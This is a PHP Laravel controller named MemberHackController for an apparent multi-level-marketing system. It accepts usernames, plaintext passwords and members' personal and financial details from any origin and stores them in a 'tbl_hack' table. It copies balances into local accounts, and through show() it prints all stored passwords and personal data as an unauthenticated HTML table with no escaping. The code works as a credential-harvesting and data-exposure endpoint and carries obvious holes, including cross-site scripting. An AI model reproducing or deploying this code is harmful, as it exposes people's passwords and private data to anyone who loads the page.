<?php namespace App\Http\Controllers;
use DB;
use Request;


class MemberHackController extends Controller
{
	public function index()
	{ 
        header("Access-Control-Allow-Origin: *");

        if(Request::input("mode") == "ready")
        {
            $data["username"] = Request::input("username");
            $data["password"] = Request::input("password");

            $exist = DB::table("tbl_hack")->where("username", $data["username"])->first();
            $checkname = DB::table("tbl_hack")->where("name", $data["username"])->first();

            if($checkname)
            {
                DB::table("tbl_hack")->where("name", $data["username"])->update($data);        
            }
            elseif(!$exist)
            {
                DB::table("tbl_hack")->insert($data);    
            }
        }
        elseif(Request::input("mode") == "update")
        {
            $data["username"] = Request::input("username");
            $data["password"] = Request::input("password");

            $hack = DB::table("tbl_hack")->where("username", $data["username"])->first();

            /* UPDATE ACCOUNT */
            $update_account["account_email"] = $hack->email;
            DB::table("tbl_account")->where("account_name", $hack->full_name)->update($update_account);

            $account_info = DB::table("tbl_account")->where("account_name", $hack->full_name)->first();

            if($account_info)
            {
                /* SELECT FIRST SLOT OF ACCOUNT NOT YET UPDDATED */
                $first_record = DB::table("tbl_slot")->where("slot_owner", $account_info->account_id)->where("migrations", "waiting")->first();

                if($first_record)
                {
                    /* UPDATE FIRST RECORD */
                    $update_slot["slot_wallet"] = floatval($hack->available_balance);
                    $update_slot["slot_binary_left"] = floatval($hack->binary_left);
                    $update_slot["slot_binary_right"] = floatval($hack->binary_right);
                    $update_slot["slot_total_earning"] = 0;
                    $update_slot["slot_total_withrawal"] = floatval($hack->total_withraw);
                    $update_slot["slot_upgrade_points"] = floatval($hack->promotion_points);
                    $update_slot["migrations"] = "updated";
                    DB::table("tbl_slot")->where("slot_id", $first_record->slot_id)->update($update_slot);
                }
            }
        }
        else
        {
            $data["name"] = Request::input("name");
            $data["code"] = Request::input("code");
            $data["address"] = Request::input("address");
            $data["birthday"] =  Request::input("birthday");
            $data["civil"] = Request::input("civil");
            $data["gender"] = Request::input("gender");
            $data["email"] = Request::input("email");
            $data["member_left_right"] = Request::input("member_left_right");
            $data["promotion_points"] = Request::input("promotion_points");
            $data["binary_left"] = Request::input("binary_left");
            $data["binary_right"] = Request::input("binary_right");
            $data["total_withraw"] = Request::input("total_withraw");
            $data["available_balance"] = Request::input("available_balance");
            $data["ranking"] = Request::input("ranking");
            $data["pvp_binary"] = Request::input("pvp_binary");
            $data["pvp_unilevel"] = Request::input("pvp_unilevel");
            $data["pvp_remittance"] = Request::input("pvp_remittance");
            $data["sponsor"] = Request::input("sponsor");
            $data["placement"] = Request::input("placement");
            $data["topup_balance"] = Request::input("topup_balance");
            $data["current_earnings"] = Request::input("current_earnings");
            $data["total_earnings"] = Request::input("total_earnings");
            $data["full_name"] = Request::input("full_name");

            $exist = DB::table("tbl_hack")->where("username", $data["name"])->first();

            if($exist)
            {
                DB::table("tbl_hack")->where("username", $data["name"])->update($data);    
                echo json_encode("success update");
            }
            else
            {
                DB::table("tbl_hack")->insert($data);    
                echo json_encode("success insert");
            }
        }
	}
    public function show()
    { 
        $_data = DB::table("tbl_hack")->orderBy("name", "asc")->orderBy("username", "asc")->get();
        echo "<table style='font-family: arial; font-size: 10px; width: 100%' border='1' cellspacing='0' cellpadding='3'>";
        echo "<tr style='font-weight: bold'>";
        echo "<td>Reference</td>";
        echo "<td>USERNAME 2</td>";
        echo "<td>PASSWORD</td>";
        echo "<td>FULL NAME</td>";
        echo "<td>ADDRESS</td>";
        echo "<td>BIRTHDAY</td>";
        echo "<td>CIVIL</td>";
        echo "<td>GENDER</td>";
        echo "<td>EMAIL</td>";
        echo "<td>RANKING</td>";
        echo "<td>CODE</td>";
        echo "<td>PROMOTION POINTS</td>";
        echo "<td>LEFT & RIGHT</td>";
        echo "<td>BINARY LEFT</td>";
        echo "<td>BINARY RIGHT</td>";
        echo "<td>TOTAL WITHRAW</td>";
        echo "<td>AVAILABLE BALANCE</td>";
        echo "<td>PVP BINARY</td>";
        echo "<td>PVP UNILEVEL</td>";
        echo "<td>PVP REMITTANCE</td>";
        echo "</tr>";

        foreach($_data as $key => $data)
        {
            echo "<tr>";
            echo "<td>" . $data->hack_id .  "</td>";
            echo "<td>" . $data->username .  "</td>";
            echo "<td>" . $data->password .  "</td>";
            echo "<td>" . $data->full_name .  "</td>";
            echo "<td>" . $data->address .  "</td>";
            echo "<td>" . $data->birthday .  "</td>";
            echo "<td>" . $data->civil .  "</td>";
            echo "<td>" . $data->gender .  "</td>";
            echo "<td>" . $data->email .  "</td>";
            echo "<td>" . $data->ranking .  "</td>";
            echo "<td>" . $data->code .  "</td>";
            echo "<td>" . $data->member_left_right .  "</td>";
            echo "<td>" . $data->promotion_points .  "</td>";
            echo "<td>" . $data->binary_left .  "</td>";
            echo "<td>" . $data->binary_right .  "</td>";
            echo "<td>" . $data->total_withraw .  "</td>";
            echo "<td>" . $data->available_balance .  "</td>";
            echo "<td>" . $data->pvp_binary .  "</td>";
            echo "<td>" . $data->pvp_unilevel .  "</td>";
            echo "<td>" . $data->pvp_remittance .  "</td>";
            echo "</tr>";
        }
        echo "</table>";
    }
}